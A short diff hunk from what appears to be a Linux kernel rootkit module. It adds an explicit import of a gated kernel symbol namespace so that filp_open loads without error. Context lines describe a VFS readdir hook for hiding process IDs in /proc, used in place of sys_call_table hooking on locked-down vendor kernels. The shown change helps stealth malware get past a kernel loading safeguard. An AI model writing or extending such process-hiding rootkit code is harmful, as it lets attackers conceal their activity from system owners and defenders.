@@ -22,6 +22,11 @@ typedef int hide_filldir_ret_t;
 #include <linux/spinlock.h>
 #include <linux/uidgid.h>
 
+/* filp_open lives in a gated namespace; import it explicitly (any module
+ * may, it just has to say so). Without this the loader rejects the
+ * module (EINVAL), even though the symbol exists. */
+MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
+
 /* VFS readdir hook for /proc pid hiding.
  *
  * Why not sys_call_table: on obscured OEM kernels the table is not
